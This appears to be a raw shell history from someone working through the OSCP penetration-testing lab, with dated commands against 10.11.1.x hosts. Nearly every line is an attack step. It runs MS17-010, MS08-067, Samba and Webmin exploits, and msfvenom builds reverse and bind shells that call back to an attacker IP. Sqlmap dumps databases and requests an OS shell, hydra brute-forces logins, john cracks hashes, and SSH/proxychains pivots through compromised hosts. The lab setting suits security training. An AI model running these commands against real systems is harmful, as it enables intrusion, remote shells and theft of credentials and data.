 1960  2020-09-07 19:42  #ssh   -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -v
 1961  2020-09-07 19:43  find  ./ | grep f1fb2162a02f0f7c40c210e6167f05ca-16858\n
 1962  2020-09-07 19:55  cd _full_tcp_nmap.txt
 1963  2020-09-07 20:05  cat tcp_6532_http_nikto.txt
 1964  2020-09-07 20:18  cat tcp_6532_http_index.html
 1965  2020-09-07 20:30  cat tcp_6532_http_nikto.txt\n
 1966  2020-09-07 20:30  cat tcp_6532_http_robots.txt
 1967  2020-09-07 20:30  cat tcp_6532_http_gobuster.txt
 1968  2020-09-07 20:35  cat tv.txt
 1969  2020-09-07 20:37  cat /usr/lib/python3/dist-packages/cherrypy/_cpchecker.py
 1970  2020-09-07 20:37  vim /usr/lib/python3/dist-packages/samba/dbchecker.py
 1971  2020-09-07 21:11  smbclient  //10.11.1.227/"share" -U ""
 1972  2020-09-07 21:12  ca ttcp_21_ftp_hydra.txt
 1973  2020-09-07 21:13  ftp 10.11.1.227
 1974  2020-09-07 21:15  cp /usr/lib/python3/dist-packages/samba/dbchecker.py ./
 1975  2020-09-07 21:15  chmod +z dbchecker.py
 1976  2020-09-07 21:15  cmod +x dbchecker.py
 1977  2020-09-07 21:15  chmod +x dbchecker.py
 1978  2020-09-07 21:15  ./dbchecker.py
 1979  2020-09-07 21:19  searchsploit Microsoft ESMTP 5.0.2195.5329\n
 1980  2020-09-07 21:52  locate / | grep checker.py
 1981  2020-09-07 21:53  vim dbchecker.py
 1982  2020-09-07 21:54  python dbchecker.py
 1983  2020-09-07 21:54  python3 dbchecker.py
 1984  2020-09-07 21:54  python3 dbchecker.py 12
 1985  2020-09-07 21:54  python dbchecker.py 12
 1986  2020-09-07 21:55  git clone https://github.com/worawit/MS17-010.git
 1987  2020-09-07 21:55  cd MS17-010
 1988  2020-09-07 21:56  cp checker.py ~/OSCP/results/10.11.1.227/exploit
 1989  2020-09-07 21:56  cd ~/OSCP/results/10.11.1.227/exploit
 1990  2020-09-07 21:56  chmod +x checker.py
 1991  2020-09-07 21:56  vim checker.py
 1992  2020-09-07 21:59  ./checker.py
 1993  2020-09-07 21:59  python checker.py
 1994  2020-09-07 21:59  python3 checker.py
 1995  2020-09-07 21:59  pip3 install --user mysmb
 1996  2020-09-07 21:59  pip install --user mysmb
 1997  2020-09-07 21:59  pip3 install mysmb
 1998  2020-09-07 22:00  searchsploit eternalblue\n
 1999  2020-09-07 22:00  cat tcp_1025_rpc_nmap.txt
 2000  2020-09-07 22:01  cat tcp_5800_vnc_nmap.txt
 2001  2020-09-07 22:45  git commit -m "finished JD"
 2002  2020-09-07 22:52  /*-/*-/
 2003  2020-09-07 22:55  casst _full_tcp_nmap.txt
 2004  2020-09-07 23:21  find  ./ | grep Ms08-067\n
 2005  2020-09-07 23:21  find / | grep Ms08-067\n
 2006  2020-09-07 23:26  git clone https://github.com/andyacer/ms08_067.git
 2007  2020-09-07 23:29  cd ms08_067
 2008  2020-09-07 23:29  cp ../../OSCP/results/10.11.1.227/exploit
 2009  2020-09-07 23:29  cp ms08_067_2018.py ../../OSCP/results/10.11.1.227/exploit
 2010  2020-09-07 23:29  cd ../../OSCP/results/10.11.1.227/exploit
 2011  2020-09-07 23:29  chmod +x ms08_067_2018.py
 2012  2020-09-07 23:39  scd ..
 2013  2020-09-07 23:49  pip3 install --user Impacket
 2014  2020-09-07 23:50  pip3 install --user PyCrypto
 2015  2020-09-07 23:50  python3 ms08_067_2018.py
 2016  2020-09-07 23:50  pip install pycrypto
 2017  2020-09-07 23:51  sudo apt install python-pip
 2018  2020-09-07 23:54  pip install --user Impacket
 2019  2020-09-07 23:54  pip install --user PyCrypto
 2020  2020-09-07 23:56  python ms08_067_2018.py
 2021  2020-09-08 00:06  python ms08_067_2018.py 192.168.119.217 445
 2022  2020-09-08 00:32  python ms08_067_2018.py 192.168.119.217 Windows 2000 139
 2023  2020-09-08 00:39  python ms08_067_2018.py -h
 2024  2020-09-08 00:39  python MS08_067_2018.py 10.11.1.227 2 139 -- for Windows 2000 Universal, port 139
 2025  2020-09-08 00:45  python ms08_067_2018.py 10.11.1.227  139 -- for Windows 2000 Universal, port 139
 2026  2020-09-08 00:46  msfvenom -p windows/shell_bind_tcp RHOST=192.168.119.217 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows\n
 2027  2020-09-08 00:48  msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.227 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows\n
 2028  2020-09-08 00:55  python ms08_067_2018.py 10.11.1.227 2 139 -- for Windows 2000 Universal, port 139
 2029  2020-09-08 01:00  vim ms08_067_2018.py
 2030  2020-09-08 01:13  cat tcp_8080_http_index.html
 2031  2020-09-08 01:14  at tcp_5985_http_gobuster.txt
 2032  2020-09-08 01:28  cat tcp_1521_oracle_tnscmd_ping.txt
 2033  2020-09-08 01:28  cat tcp_1521_oracle_tnscmd_version.txt
 2034  2020-09-08 01:28  cat tcp_2030_oracle_tnscmd_version.txt
 2035  2020-09-08 01:28  cat tcp_47001_http_nmap.txt
 2036  2020-09-08 02:11  cat tcp_8080_http_robots.txt
 2037  2020-09-08 02:14  cat tcp_1521_oracle_nmap.txt
 2038  2020-09-08 04:49  d
 2039  2020-09-08 04:50  cp shell.php ../../10.11.1.251/exploit
 2040  2020-09-08 04:50  cd ../../10.11.1.251/exploit \n
 2041  2020-09-08 05:13  cewl http://10.11.1.251/wp/ --write indexwl.txt
 2042  2020-09-08 05:13  cat indexwl.txt
 2043  2020-09-08 05:22  vim 404.php
 2044  2020-09-08 05:23  cat shell.php > ../scans/404.php
 2045  2020-09-08 05:23  vim ../scans/404.php \n
 2046  2020-09-08 05:23  ftp 10.11.1.251
 2047  2020-09-08 07:06  wpscan --url http://10.11.1.251/wp/  --enumerate ap,at,cb,dbe
 2048  2020-09-08 21:06  6GA1zrsc3nE
 2049  2020-09-08 21:06  sqlmap 
 2050  2020-09-08 21:15  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell
 2051  2020-09-08 22:02  vim session.sqlite
 2052  2020-09-08 22:02  vim target.txt
 2053  2020-09-08 22:04  cd ~/OSCP/results/10.11.1.251/scans
 2054  2020-09-08 22:05  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --dbs
 2055  2020-09-08 22:09  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --wordpress
 2056  2020-09-08 22:17  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --dbs --dump-all 
 2057  2020-09-08 23:22  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress
 2058  2020-09-08 23:39  cd ~/OSCP/results/10.11.1.251/scans 
 2059  2020-09-08 23:59  /home/kali/.local/share/sqlmap/output/10.11.1.251
 2060  2020-09-08 23:59  vim socket_instances.csv
 2061  2020-09-09 00:00  cd history
 2062  2020-09-09 00:00  vim sql.hst
 2063  2020-09-09 00:00  cd OSCP/]
 2064  2020-09-09 00:08  ca tlog
 2065  2020-09-09 00:14  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T users --columns
 2066  2020-09-09 00:20  cat log
 2067  2020-09-09 00:24  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users --dump
 2068  2020-09-09 00:34  cd /home/kali/.local/share/sqlmap/output/10.11.1.251
 2069  2020-09-09 00:34  cd dump
 2070  2020-09-09 00:34  cd performance_schema
 2071  2020-09-09 00:37  ssh   -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -v
 2072  2020-09-09 01:55  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --dbs 
 2073  2020-09-09 02:10  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress --tables
 2074  2020-09-09 02:14  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users --columns
 2075  2020-09-09 02:18  sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users -dump
 2076  2020-09-09 02:26  cd results/10.11.1.251
 2077  2020-09-09 02:26  cherrytree sean251.ctb
 2078  2020-09-09 01:36  cd 10.11.1.251
 2079  2020-09-09 01:41  hishtory
 2080  2020-09-09 01:41  histroy
 2081  2020-09-09 01:52  vim tcp_80_http_wpscan.txt
 2082  2020-09-09 01:54  wpscan --url http://10.11.1.251:80/wp 
 2083  2020-09-09 03:23  sudo apt-get install sshuttle\n
 2084  2020-09-09 03:25  sshuttle -r sean@sshserver 10.11.1.251
 2085  2020-09-09 03:39  sshuttle -r sean@10.11.1.251
 2086  2020-09-09 04:06  $ sudo proxychains nmap --top-ports=20 -sT -Pn 10.11.1.251
 2087  2020-09-09 04:07  #nmap -sn 10.11.1.0/24\n
 2088  2020-09-09 04:37  ls al
 2089  2020-09-09 07:03  ls -a,l
 2090  2020-09-09 07:29  nmap -sn 10.1.1.0/24\n
 2091  2020-09-09 07:30  i opa
 2092  2020-09-09 07:30  ping 10.1.1.1\n
 2093  2020-09-09 08:08  sshuttle --dns -r sean@10.11.1.251 0.0.0.0/24
 2094  2020-09-09 08:10  ping 10.1.1.1
 2095  2020-09-09 08:11  sshuttle --dns -r sean@10.11.1.251 0.0.0.0/0
 2096  2020-09-09 19:26  ssh -D
 2097  2020-09-09 19:26  ssh -D 9050 sean@10.11.1.251
 2098  2020-09-09 19:27  $ sudo proxychains nmap -sn 10.11.1.0/24  
 2099  2020-09-09 19:29  $ sudo proxychains nmap -sn 10.1.1.0/24
 2100  2020-09-09 19:34  sudo proxychains  apt-get update\n
 2101  2020-09-09 19:37  /usr/bin/proxychains
 2102  2020-09-09 19:37  vim /usr/bin/proxychains
 2103  2020-09-09 19:39  sudo ssh -D 9050 sean@10.11.1.251
 2104  2020-09-09 19:40  proxychains ping 10.1.1.27
 2105  2020-09-09 19:40  sshuttle -r sean@10.11.1.251 0.0.0.0/0
 2106  2020-09-09 19:43  source /etc/proxychains.conf\n
 2107  2020-09-09 19:45  sudo systemctl restart ssshd.service\n
 2108  2020-09-09 19:48  autorecon  10.11.1.251 
 2109  2020-09-09 19:48  rm -rf 10.11.1.251
 2110  2020-09-09 19:49  #autorecon  10.11.1.251 
 2111  2020-09-09 19:49  sudo proxychains autorecon 10.1.1.27
 2112  2020-09-09 20:42  cat tcp_49703_oracle_tnscmd_version.txt
 2113  2020-09-09 20:42  cat tcp_2030_oracle_tnscmd_ping.txt
 2114  2020-09-09 20:42  cat tcp_1521_oracle_scanner.txt
 2115  2020-09-09 20:42  cat tcp_2030_oracle_nmap.txt
 2116  2020-09-09 20:42  cat tcp_49703_oracle_nmap.txt
 2117  2020-09-09 20:46  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --dbs 
 2118  2020-09-09 20:46  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users -dump
 2119  2020-09-09 20:46  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 --dbs
 2120  2020-09-09 20:47  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --threads 10 --dbs
 2121  2020-09-09 20:47  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL  --threads 10 --dbs
 2122  2020-09-09 20:47  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL  --forms --crawl=2 --threads 10 --dbs
 2123  2020-09-09 20:47  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT ----forms --crawl=2 --threads 10 --dbs
 2124  2020-09-09 20:47  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --forms --crawl=2 --threads 10 --dbs
 2125  2020-09-09 20:48  sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" 
 2126  2020-09-09 21:56  sudo service proxychains start
 2127  2020-09-09 21:56  netstat
 2128  2020-09-09 21:57  netstat | grep connected
 2129  2020-09-09 21:57  netstat | grep listening
 2130  2020-09-09 22:14  tor
 2131  2020-09-09 22:15  sudo apt install tor\n
 2132  2020-09-09 22:16  sudo ssh  -D  127.0.0.1:8080 sean@10.11.1.251
 2133  2020-09-09 22:17  sudo ssh  -D  127.0.0.1:9050 sean@10.11.1.251
 2134  2020-09-09 22:21  sudo ssh  -D -N  127.0.0.1:9050 sean@10.11.1.251
 2135  2020-09-09 22:25  netstat -an
 2136  2020-09-09 22:26  netstat -tulpn | grep LISTEN
 2137  2020-09-09 22:32  sudo netstat -tulpn | grep LISTEN
 2138  2020-09-09 22:35  sudo ssh -N -D   127.0.0.1:8080 sean@10.11.1.251
 2139  2020-09-09 22:53  proxychains firefox google.com
 2140  2020-09-09 23:02  sqlmap -u http://10.11.1.222:8080/blog/login.jsp -p "id"\n
 2141  2020-09-09 23:03  sqlmap -u http://10.11.1.222:8080/blog/login.jsp --forms --crawl=2\n
 2142  2020-09-09 23:05  sqlmap -u http://10.11.1.222:8080/blog/login.jsp\?id\=1%20-p%20%22id%22%20--dbms\=mysql%20--os-shell
 2143  2020-09-09 23:44  _manual_commands.txt
 2144  2020-09-09 23:51  cat tcp_8080_http_auth_medusa.txt
 2145  2020-09-10 02:07  sudo  proxychains ping 10.1.1.27
 2146  2020-09-10 05:27  sudo service tor enable
 2147  2020-09-10 05:27  sshuttle -r sean@10.11.1.251 127.0.0.1:9050
 2148  2020-09-10 05:30  sudo proxychains nmap --top-ports=20 -sT -Pn 10.1.1.27
 2149  2020-09-10 05:36  sqlmap -u http://10.11.1.222:8080/blog/login.jsp 
 2150  2020-09-10 05:38  sqlmap -u http://10.11.1.222:8080/blog/login.jsp --current-user
 2151  2020-09-10 23:05  hashid
 2152  2020-09-10 23:05  hashid d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892
 2153  2020-09-10 23:06  touch web_app.txt
 2154  2020-09-10 23:07  echo d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 >> web_app.txt 
 2155  2020-09-10 23:07  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt web_app.txt
 2156  2020-09-10 23:17  cd  ~/OSCP/results/10.11.1.222/exploit 
 2157  2020-09-10 23:17  vim web_app.txt
 2158  2020-09-10 23:23  /usr/sbin/john --format=descrypt --rules -w=/usr/share/wordlists/rockyou.txt web_app.txt 
 2159  2020-09-10 23:24  /usr/sbin/john --format:descrypt --rules -w=/usr/share/wordlists/rockyou.txt sa_pass.txt
 2160  2020-09-10 23:24  /usr/sbin/john --format:descrypt --rules -w=/usr/share/wordlists/rockyou.txt web_app.txt
 2161  2020-09-10 23:26  /usr/sbin/john --format=gost --rules -w=/usr/share/wordlists/rockyou.txt web_app.txt 
 2162  2020-09-10 23:49  tcp_49665_rpc_nmap.txt
 2163  2020-09-10 23:50  rpcclient -p 49684 -U "web_app" 10.11.1.222\n
 2164  2020-09-10 23:54  sqsh -S 10.11.1.222 -U WEB_APP -P "adminadmin"
 2165  2020-09-10 23:54  sqsh -S 10.11.1.222 -U "WEB_APP" -P "adminadmin"
 2166  2020-09-10 23:54  sqsh -S 10.11.1.222 -U web_app -P adminadmin
 2167  2020-09-10 23:54  sqsh -S 10.11.1.222 -U web_app -P "adminadmin"
 2168  2020-09-11 00:35  msfvenom  -p  windows/meterpreter/reverse_tcp lhost=192.168.119.217 lport=4444  -f asp -o meterpreterx86.asp
 2169  2020-09-11 00:39  msfvenom  -p  windows/x86/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f aspx -o meterpreter.aspx
 2170  2020-09-11 00:40  msfvenom  -p  windows/
 2171  2020-09-11 00:41  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=443 -f jsp -o rshell.jsp
 2172  2020-09-11 00:51  msfvenom -p windows/meterpreter/java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f jsp -o rshell.jsp
 2173  2020-09-11 00:52  msfvenom -p windows/java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f jsp -o rshell.jsp
 2174  2020-09-11 00:53  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f jsp -o rshell.jsp
 2175  2020-09-11 00:55  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f asp -o rshell.jsp
 2176  2020-09-11 00:55  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f java -o rshell.jsp
 2177  2020-09-11 00:56  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f raw -o rshell.jsp
 2178  2020-09-11 01:22  git commit -m "sean finished 251"
 2179  2020-09-11 01:26  sudo autorecon 10.1.1.115
 2180  2020-09-11 01:27  sudo autorecon 10.1.1.116
 2181  2020-09-11 03:36  rm -rf 10.1.1.116 10.1.1.115
 2182  2020-09-11 03:36  sudo rm -rf 10.1.1.116 10.1.1.115
 2183  2020-09-11 03:36  sudo autorecon 10.10.1.116
 2184  2020-09-11 03:37  sudo rm 10.10.1.116
 2185  2020-09-11 03:37  sudo rm -rf 10.10.1.116
 2186  2020-09-11 03:38  sudo autorecon 10.11.1.116
 2187  2020-09-11 03:38  sudo autorecon 10.11.1.115
 2188  2020-09-11 04:25  sudo                hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/home/kali/OSCP/results/10.11.1.116/scans/tcp_21_ftp_hydra.txt" ftp://10.11.1.116\n
 2189  2020-09-11 04:49  ftp 10.11.1.116
 2190  2020-09-11 07:15  searchsploit hpLiteAdmin v1.9.3
 2191  2020-09-11 07:15  searchsploit phpLiteAdmin v1.9.3
 2192  2020-09-11 07:15  searchsploit phpLiteAdmin 1.9.3
 2193  2020-09-11 07:15  find / | grep php/webapps/24044.txt 2 > /dev/null
 2194  2020-09-11 07:15  find / | grep php/webapps/24044.txt 
 2195  2020-09-11 07:16  vim /usr/share/exploitdb/exploits/php/webapps/24044.txt
 2196  2020-09-11 07:16  cp  /usr/share/exploitdb/exploits/php/webapps/24044.txt ./
 2197  2020-09-11 07:17  sudo cp  /usr/share/exploitdb/exploits/php/webapps/24044.txt ./
 2198  2020-09-11 07:17  vim 24044.txt
 2199  2020-09-11 08:31  sudo cp ~/OSCP/8/tmp/shell.php ./
 2200  2020-09-11 08:32  less 24044.txt
 2201  2020-09-11 08:36  sudo vim shell.php
 2202  2020-09-11 09:22  cp ~/Downloads/LinEnum/LinEnum.sh ./
 2203  2020-09-11 09:22  sudo cp ~/Downloads/LinEnum/LinEnum.sh ./
 2204  2020-09-11 09:48  cd 10.11.1.116/exploit
 2205  2020-09-11 09:48  find / | grep 44298.c
 2206  2020-09-11 09:49  sudo cp /usr/share/exploitdb/exploits/linux/local/44298.c ./ 
 2207  2020-09-11 09:50  gcc 44298.c -O KE
 2208  2020-09-11 09:50  gcc 44298.c -o KE
 2209  2020-09-11 09:50  sudo gcc 44298.c -o KE
 2210  2020-09-11 09:56  serachsploit 4.4.0-116-generic\n
 2211  2020-09-11 09:56  searchsploit 4.4.0-116-generic\n
 2212  2020-09-11 09:56  searchsploit 4.4.0-116\n
 2213  2020-09-11 10:00  sudo mv dotty.ctb 10.11.1.116/report
 2214  2020-09-11 10:01  git commit -m "done dotty"
 2215  2020-09-11 19:47  smbclient  //10.11.1.115/"tophat" -U ""
 2216  2020-09-11 19:47  smbclient  //10.11.1.115/"BREAK" -U ""
 2217  2020-09-11 19:51  nmap --script smb-enum-shares.nse -p139.11.1.115
 2218  2020-09-11 19:51  nmap --script smb-enum-shares.nse -p139 10.11.1.115
 2219  2020-09-11 20:12  cd 5
 2220  2020-09-11 20:18  nmap -sV -oA blue --script=safe 10.11.1.115
 2221  2020-09-11 20:18  sudo nmap -sV -oA blue --script=safe 10.11.1.115
 2222  2020-09-11 20:21  searchsploit ntlm 0.12
 2223  2020-09-11 20:21  searchsploit ntlm 
 2224  2020-09-11 20:22  searchsploit smb  
 2225  2020-09-11 20:22  searchsploit smb  v1
 2226  2020-09-11 20:31  find / | grep MS08-068
 2227  2020-09-11 20:33  smbclient  //10.11.1.115/ -U ""
 2228  2020-09-11 20:33  smbclient  //10.11.1.115/ -U "TOPHAT"
 2229  2020-09-11 20:33  smbclient  //10.11.1.115/workgroup -U "TOPHAT"
 2230  2020-09-11 20:49  smbclient  //10.11.1.115
 2231  2020-09-11 20:49  smbclient  //10.11.1.115/workgroup -U ""
 2232  2020-09-11 21:46  ls -all
 2233  2020-09-11 21:47  smbclient -L \\10.11.1.115
 2234  2020-09-11 21:48  serachsploit samba 2.2.7\n
 2235  2020-09-11 21:49  locate / | grep multiple/remote/10.c
 2236  2020-09-11 21:51  vim /usr/share/exploitdb/exploits/multiple/remote/10.c
 2237  2020-09-11 21:54  cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./ 
 2238  2020-09-11 21:54  sudo cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./ 
 2239  2020-09-11 21:54  vi m1
 2240  2020-09-11 21:54  vim 10.c 
 2241  2020-09-11 21:54  sudo gcc 10.c
 2242  2020-09-11 21:54  rm -rf a.out
 2243  2020-09-11 21:54  sudo rm -rf a.out
 2244  2020-09-11 21:54  sudo gcc 10.c -o smba2.2.7
 2245  2020-09-11 21:54  ./smba2.2.7
 2246  2020-09-11 21:55  ./smba2.2.7 10.11.1.115
 2247  2020-09-11 22:06  searchsploit samba 2.2.7\n
 2248  2020-09-11 22:14  ./smba2.2.7 -b 0 10.11.1.115
 2249  2020-09-11 22:21  git commit -m "finished .115"
 2250  2020-09-11 22:28  nmap -p 2233 10.11.1.1-255 
 2251  2020-09-11 22:34  cat web_app.txt
 2252  2020-09-11 22:38  find / | grep mimikatz
 2253  2020-09-11 22:38  cd ~/OSCP/results/10.11.1.222
 2254  2020-09-11 22:39  mv /home/kali/OSCP/results/10.11.1.50/exploit/mimikatz.exe ./
 2255  2020-09-11 22:55  autorecon 10.11.1.121
 2256  2020-09-11 23:38  autorecon 10.11.1.128
 2257  2020-09-12 01:14  autorecon 10.11.1.141
 2258  2020-09-12 01:15  autorecon 10.11.1.217
 2259  2020-09-12 08:16  cat tcp_10000_http_robots.txt
 2260  2020-09-12 08:18  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 10000 -o "/home/kali/OSCP/results/10.11.1.141/scans/tcp_10000_http_auth_hydra.txt" http-get://10.11.1.141:10000/session_login.cgi
 2261  2020-09-12 08:19  curl http://10.11.1.141:10000/session_login.cgi
 2262  2020-09-12 08:21  cat tcp_111_showmount.txt
 2263  2020-09-12 08:22  showmount -e 192.168.100.25\n\n
 2264  2020-09-12 08:27  service nfs start
 2265  2020-09-12 08:27  sudo service nfs start
 2266  2020-09-12 08:27  sudo showmount -e 10.11.1.147\n\n
 2267  2020-09-12 08:30  showmount
 2268  2020-09-12 08:30  sudo showmount
 2269  2020-09-12 08:31  service rpcbind restart\n
 2270  2020-09-12 08:31  sudo service rpcbind restart\n
 2271  2020-09-12 08:31  sudo showmount -h
 2272  2020-09-12 08:32  sudo apt instlal nfs
 2273  2020-09-12 08:32  sudo apt instlal nfs.common
 2274  2020-09-12 08:32  sudo apt install nfs
 2275  2020-09-12 08:32  sudo apt install nfs.common
 2276  2020-09-12 08:32  sudo apt-get install nfs-common\n
 2277  2020-09-12 08:33  sudo apt install -y nfs-kernel-server
 2278  2020-09-12 08:33  sudo systemctl enable nfs-kernel-server
 2279  2020-09-12 08:34  sudo apt-get install rpcbind nfs-kernel-server\n
 2280  2020-09-12 08:34  sudo systemctl enable rpcbind.service\n
 2281  2020-09-12 08:34  sudo systemctl enable nfs-kernel-server\n
 2282  2020-09-12 08:34  sudo service nfs status
 2283  2020-09-12 08:43  + Server: MiniServ/0.01
 2284  2020-09-12 08:44  locate / | grep cgi/remote/21183.txt
 2285  2020-09-12 08:44  vi m/usr/share/exploitdb/exploits/cgi/remote/21183.txt
 2286  2020-09-12 08:44  vim /usr/share/exploitdb/exploits/cgi/remote/21183.txt
 2287  2020-09-12 08:49  locate / | grep multiple/remote/1997.php
 2288  2020-09-12 08:49  cp /usr/share/exploitdb/exploits/multiple/remote/1997.php ./
 2289  2020-09-12 08:50  chmod +x 1997.php
 2290  2020-09-12 08:51  ./1997.php 10.11.1.141 10000 http /etc/passwd\n
 2291  2020-09-12 08:52  locate / | grep multiple/remote/2017.pl
 2292  2020-09-12 08:52  cp /usr/share/exploitdb/exploits/multiple/remote/2017.pl ./
 2293  2020-09-12 08:52  vim 2017.pl
 2294  2020-09-12 08:52  ./2017.pl
 2295  2020-09-12 08:58  vim 1997.php
 2296  2020-09-12 08:59  sudo apt install php
 2297  2020-09-12 08:59  sudo apt upgrade php
 2298  2020-09-12 09:06  php -f 1997.php 10.11.1.141 10000 http /etc/passwd
 2299  2020-09-12 09:06  sudo showmount -e 10.11.1.147
 2300  2020-09-12 09:07  sudo showmount -e 
 2301  2020-09-12 09:07  sudo showmount 
 2302  2020-09-12 09:07  sudo showmount -e 10.11.1.1123
 2303  2020-09-12 09:07  sudo showmount -e 10.11.1.111
 2304  2020-09-12 09:08  perl 2017.pl
 2305  2020-09-12 09:08  perl 2017.pl 10.11.1.141 10000 http /etc/passwd\n
 2306  2020-09-12 09:08  perl 2017.pl 10.11.1.141 10000 http /etc/passwd -v\n
 2307  2020-09-12 09:08  perl 2017.pl 10.11.1.141 10000 http /etc/passwd -vvv\n
 2308  2020-09-12 09:08  sudo perl 2017.pl 10.11.1.141 10000 http /etc/passwd \n
 2309  2020-09-12 09:08  vim 2017.pl 
 2310  2020-09-12 09:09  sudo perl 2017.pl 10.11.1.141 10000 http ls\n
 2311  2020-09-12 09:09  sudo perl 2017.pl 10.11.1.141 10000  /etc/shadow\n
 2312  2020-09-12 09:09  sudo perl 2017.pl 10.11.1.141 10000 0  /etc/shadow\n
 2313  2020-09-12 09:09  sudo perl 2017.pl 10.11.1.141 10000 1  /etc/shadow\n
 2314  2020-09-12 09:09  sudo perl 2017.pl 10.11.1.141 10000 https  /etc/shadow\n
 2315  2020-09-12 09:10  sudo perl 2017.pl 10.11.1.141 10000 http  /etc/shadow\n
 2316  2020-09-12 09:10  sudo perl 2017.pl 10.11.1.141 10000 dhttp  /etc/shadowa\n
 2317  2020-09-12 09:10  sudo perl 2017.pl 10.11.1.141w 10000 http  /etc/shadow\n
 2318  2020-09-12 09:10  sudo perl 2017.pl 10.11.1.141w 10000 
 2319  2020-09-12 09:11  sudo perl session_login.cgi 10000 /etc/passwd 10.11.1.141
 2320  2020-09-12 09:12  perl 2017.pl session_login.cgi 10000 /etc/passwd 10.11.1.141
 2321  2020-09-12 09:12  perl 2017.pl http://10.11.1.141:10000/session_login.cgi 10000 /etc/passwd 10.11.1.141
 2322  2020-09-12 09:12  perl 2017.pl http://10.11.1.141:10000/session_login.cgi 10000 /etc/passwd 
 2323  2020-09-12 09:13  perl 2017.pl http://10.11.1.141:10000/session_login.cgi 10000 /etc/passwd 1
 2324  2020-09-12 09:14  perl 2017.pl http://10.11.1.141:10000/session_login.cgi 10000 /etc/passwd 0
 2325  2020-09-12 09:14  php -r
 2326  2020-09-12 09:15  php 1997.php
 2327  2020-09-12 09:15  php 1997.php http://10.11.1.141:10000/session_login.cgi 10000 http /etc/shadow
